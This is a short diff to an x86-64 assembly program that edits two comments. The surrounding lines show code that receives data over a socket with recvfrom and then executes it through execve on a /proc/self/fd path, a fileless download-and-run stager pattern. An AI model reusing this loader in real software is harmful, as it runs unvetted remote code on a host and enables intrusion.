@@ -58,7 +58,7 @@ _start:
 	; r15 = address
 	mov R15, RAX
 
-	; int recvfrom(fd, buf, size, WAITALL, nullptr, 0);
+	; recvfrom(fd, buf, size, WAITALL, nullptr, 0);
 	mov RAX, 45
 	mov RDI, R13
 	mov RSI, R15
@@ -111,7 +111,7 @@ convert_loop:
 	; === CONCAT DONE ===
 
 
-	; execve(fd, [], [])
+	; execve(/proc/self/fd/..., [], [])
 	mov RAX, 0x3b
 	lea RDI, [RSP]
 	xor RDX, RDX
